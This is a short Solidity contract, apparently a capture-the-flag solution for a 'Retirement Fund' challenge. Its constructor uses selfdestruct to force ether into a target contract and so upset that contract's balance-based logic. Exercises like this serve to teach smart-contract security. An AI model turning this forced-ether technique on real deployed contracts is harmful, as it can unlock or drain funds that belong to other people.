///SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract RetirementFundChallengeAttack {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}
